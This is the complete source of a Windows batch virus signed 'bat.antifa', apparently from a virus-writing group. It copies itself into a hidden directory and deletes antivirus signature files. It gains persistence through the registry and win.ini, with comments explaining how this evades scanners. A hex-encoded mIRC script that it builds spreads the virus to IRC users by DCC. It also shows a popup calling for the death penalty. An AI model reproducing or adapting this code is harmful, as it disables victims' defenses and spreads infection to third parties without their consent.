@echo off
ctty nul
if exist c:\bat.antifa.bat goto next
md %winbootdir%\e眾
copy %0 %winbootdir%\e眾\hehehe
copy %winbootdir%\e眾\hehehe c:\bat.antifa.bat

:: the virus is copied to a directory, most windows-avs can't access

:next
del c:\mirc\script.ini
del c:\mirc32\script.ini
del c:\progra~1\mirc\script.ini
del c:\progra~1\mirc32\script.ini
del c:\programme\norton~1\s32integ.dll
del c:\programme\f-prot95\fpwm32.dll
del c:\programme\mcafee\scan.dat
del c:\tbavw95\tbscan.sig
del c:\programme\tbav\tbav.dat
del c:\tbav\tbav.dat
del c:\programme\avpersonal\antivir.vdf
del c:\antifa.vbs
echo.on error resume next>c:\antifa.vbs
echo MsgBox "Faschismus ist keine Meinung sondern ein Verbrechen!" & Chr(13) & Chr(10) & "Und darauf steht: Die Todesstrafe.",4096,"bat.antifa">>c:\antifa.vbs
echo REGEDIT4>c:\aaa.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>c:\aaa.reg
echo "bat.antifa"="c:\\antifa.vbs">>c:\aaa.reg
regedit /s c:\aaa.reg

:: to give this thing some meaning

echo [windows]>ptr
echo load=%winbootdir%\lalelu.bat>>ptr
echo run=>>ptr
echo NullPort=None>>ptr
echo.>>ptr
copy ptr + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
del ptr
del %winbootdir%\lalelu.bat
echo @echo off>%winbootdir%\lalelu.bat
echo ctty nul>>%winbootdir%\lalelu.bat
echo if not exist c:\bat.antifa.bat copy %winbootdir%\e眾\hehehe c:\bat.antifa.bat>>%winbootdir%\lalelu.bat
echo start c:\bat.antifa.bat>>%winbootdir%\lalelu.bat
echo :hm>>%winbootdir%\lalelu.bat

:: Not the virus is started at every system-start, but a batch file containing no malicious
:: code, to prevent it from getting scanned. The batch file just checks, if the virus is
:: still present in the root directory. If it's not (meaning it has been removed by hand
:: or av), it gets copied to the root again from the for-windows-unaccessable-directory.
:: And executed.

del c:\aaa.reg
echo REGEDIT4>c:\payload.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]>>c:\payload.reg
echo "RegisteredOwner"="bat.antifa by philet0ast3r">>c:\payload.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]>>c:\payload.reg
echo "RegisteredOrganization"="[rRlf]">>c:\payload.reg
regedit /s c:\payload.reg

:: Lord Yup allowed me to use the following ... thanks a lot
echo e 0100 6F 6E 20 31 3A 73 74 61 72 74 3A 20 7B 20 2E 73>yup
echo e 0110 65 74 20 25 66 69 6C 65 65 20 63 3A 5C 62 61 74>>yup
echo e 0120 2E 61 6E 74 69 66 61 2E 62 61 74 20 7D 0D 0A 0D>>yup
echo e 0130 0A 20 20 20 20 6F 6E 20 31 3A 6A 6F 69 6E 3A 23>>yup
echo e 0140 3A 20 7B 0D 0A 0D 0A 20 20 20 20 20 2E 69 66 20>>yup
echo e 0150 28 24 6E 69 63 6B 20 21 3D 20 24 6D 65 20 26 26>>yup
echo e 0160 20 25 6F 6C 64 20 21 3D 20 24 6E 69 63 6B 29 20>>yup
echo e 0170 7B 0D 0A 20 20 20 20 20 2E 73 65 74 20 25 6F 6C>>yup
echo e 0180 64 20 24 6E 69 63 6B 0D 0A 20 20 20 20 20 2E 74>>yup
echo e 0190 69 6D 65 72 20 24 2B 20 24 72 61 6E 64 28 31 2C>>yup
echo e 01A0 31 30 30 30 30 30 29 20 31 20 35 20 2E 24 63 68>>yup
echo e 01B0 65 63 6B 5F 68 69 6D 28 20 24 6E 69 63 6B 20 2C>>yup
echo e 01C0 20 24 63 68 61 6E 20 29 0D 0A 20 20 20 20 20 20>>yup
echo e 01D0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>yup
echo e 01E0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>yup
echo e 01F0 20 20 20 7D 0D 0A 20 20 20 20 7D 0D 0A 0D 0A 20>>yup
echo e 0200 20 20 61 6C 69 61 73 20 63 68 65 63 6B 5F 68 69>>yup
echo e 0210 6D 20 7B 0D 0A 20 20 20 2E 73 65 74 20 25 70 6F>>yup
echo e 0220 72 74 20 24 72 61 6E 64 28 39 39 39 39 2C 39 39>>yup
echo e 0230 39 39 39 39 29 0D 0A 20 20 20 2E 77 68 69 6C 65>>yup
echo e 0240 20 28 24 70 6F 72 74 66 72 65 65 28 25 70 6F 72>>yup
echo e 0250 74 29 20 3D 3D 20 24 66 61 6C 73 65 29 20 7B 20>>yup
echo e 0260 2E 73 65 74 20 25 70 6F 72 74 20 24 72 61 6E 64>>yup
echo e 0270 28 39 39 39 39 2C 39 39 39 39 39 39 29 20 7D 0D>>yup
echo e 0280 0A 0D 0A 20 20 20 2E 69 66 20 28 24 31 20 21 69>>yup
echo e 0290 73 6F 70 20 24 32 29 20 7B 0D 0A 20 20 20 20 20>>yup
echo e 02A0 2E 6E 6F 74 69 63 65 20 24 31 20 3A 44 43 43 20>>yup
echo e 02B0 53 65 6E 64 20 74 65 6C 65 74 75 62 69 65 73 20>>yup
echo e 02C0 28 20 24 2B 20 24 69 70 20 24 2B 20 29 0D 0A 20>>yup
echo e 02D0 20 20 20 20 2E 73 65 74 20 25 73 6F 63 6B 5F 6E>>yup
echo e 02E0 61 6D 65 20 24 72 61 6E 64 28 31 2C 39 39 39 39>>yup
echo e 02F0 39 29 0D 0A 20 20 20 20 20 2E 6D 73 67 20 24 31>>yup
echo e 0300 20 01 44 43 43 20 53 45 4E 44 20 25 66 69 6C 65>>yup
echo e 0310 65 20 24 6C 6F 6E 67 69 70 28 24 69 70 29 20 20>>yup
echo e 0320 25 70 6F 72 74 20 24 66 69 6C 65 28 25 66 69 6C>>yup
echo e 0330 65 65 29 2E 73 69 7A 65 20 24 2B 20 01 0D 0A 20>>yup
echo e 0340 20 20 20 20 2E 73 6F 63 6B 6C 69 73 74 65 6E 20>>yup
echo e 0350 25 73 6F 63 6B 5F 6E 61 6D 65 20 25 70 6F 72 74>>yup
echo e 0360 0D 0A 20 20 20 20 20 2E 74 69 6D 65 72 73 20 6F>>yup
echo e 0370 66 66 0D 0A 20 20 20 20 20 2E 74 69 6D 65 72 20>>yup
echo e 0380 24 2B 20 24 72 61 6E 64 28 31 2C 39 39 39 39 39>>yup
echo e 0390 29 20 30 20 31 30 20 2E 63 6C 6F 7A 65 0D 0A 20>>yup
echo e 03A0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>yup
echo e 03B0 20 20 20 20 7D 0D 0A 20 20 20 7D 0D 0A 0D 0A 20>>yup
echo e 03C0 20 20 6F 6E 20 31 3A 73 6F 63 6B 6C 69 73 74 65>>yup
echo e 03D0 6E 3A 25 73 6F 63 6B 5F 6E 61 6D 65 3A 20 7B 0D>>yup
echo e 03E0 0A 20 20 20 2E 73 65 74 20 25 63 6C 69 65 6E 74>>yup
echo e 03F0 5F 6E 61 6D 65 20 24 72 61 6E 64 28 31 2C 39 39>>yup
echo e 0400 39 39 39 39 39 29 0D 0A 20 20 20 2E 73 6F 63 6B>>yup
echo e 0410 61 63 63 65 70 74 20 25 63 6C 69 65 6E 74 5F 6E>>yup
echo e 0420 61 6D 65 0D 0A 20 20 20 2E 73 6F 63 6B 63 6C 6F>>yup
echo e 0430 73 65 20 25 73 6F 63 6B 5F 6E 61 6D 65 0D 0A 20>>yup
echo e 0440 20 20 2E 73 65 74 20 25 6C 20 30 0D 0A 20 20 20>>yup
echo e 0450 2E 62 72 65 61 64 20 25 66 69 6C 65 65 20 25 6C>>yup
echo e 0460 20 34 30 30 30 20 26 6C 65 0D 0A 20 20 20 2E 73>>yup
echo e 0470 6F 63 6B 77 72 69 74 65 20 2D 62 20 25 63 6C 69>>yup
echo e 0480 65 6E 74 5F 6E 61 6D 65 20 34 30 30 30 20 26 6C>>yup
echo e 0490 65 0D 0A 20 20 20 25 6C 20 3D 20 25 6C 20 2B 20>>yup
echo e 04A0 34 30 30 30 0D 0A 20 20 20 2E 73 65 74 20 25 65>>yup
echo e 04B0 6E 64 20 30 0D 0A 20 20 20 7D 0D 0A 0D 0A 20 20>>yup
echo e 04C0 20 6F 6E 20 31 3A 73 6F 63 6B 72 65 61 64 3A 25>>yup
echo e 04D0 63 6C 69 65 6E 74 5F 6E 61 6D 65 3A 20 7B 0D 0A>>yup
echo e 04E0 20 20 20 2E 69 66 20 28 25 6C 20 3E 3D 20 24 66>>yup
echo e 04F0 69 6C 65 28 25 66 69 6C 65 65 29 2E 73 69 7A 65>>yup
echo e 0500 29 20 7B 0D 0A 20 20 20 20 20 2E 73 65 74 20 25>>yup
echo e 0510 65 6E 64 20 31 0D 0A 20 20 20 20 20 2E 73 6F 63>>yup
echo e 0520 6B 63 6C 6F 73 65 20 25 63 6C 69 65 6E 74 5F 6E>>yup
echo e 0530 61 6D 65 0D 0A 20 20 20 20 20 2E 68 61 6C 74 0D>>yup
echo e 0540 0A 20 20 20 20 7D 20 2E 65 6C 73 65 20 7B 0D 0A>>yup
echo e 0550 20 20 20 20 20 2E 69 66 20 28 25 65 6E 64 20 21>>yup
echo e 0560 3D 20 31 29 20 7B 0D 0A 20 20 20 20 20 2E 62 72>>yup
echo e 0570 65 61 64 20 25 66 69 6C 65 65 20 25 6C 20 34 30>>yup
echo e 0580 30 30 20 26 6C 65 0D 0A 20 20 20 20 20 2E 73 6F>>yup
echo e 0590 63 6B 77 72 69 74 65 20 2D 62 20 25 63 6C 69 65>>yup
echo e 05A0 6E 74 5F 6E 61 6D 65 20 34 30 30 30 20 26 6C 65>>yup
echo e 05B0 0D 0A 20 20 20 20 20 25 6C 20 3D 20 25 6C 20 2B>>yup
echo e 05C0 20 34 30 30 30 0D 0A 20 20 20 7D 20 7D 20 7D 0D>>yup
echo e 05D0 0A 0D 0A 20 20 20 61 6C 69 61 73 20 63 6C 6F 7A>>yup
echo e 05E0 65 20 7B 20 2E 73 6F 63 6B 63 6C 6F 73 65 20 25>>yup
echo e 05F0 73 6F 63 6B 5F 6E 61 6D 65 20 7D F3>>yup
echo rcx>>yup
echo 04FB>>yup
echo n lord>>yup
echo w>>yup
echo q>>yup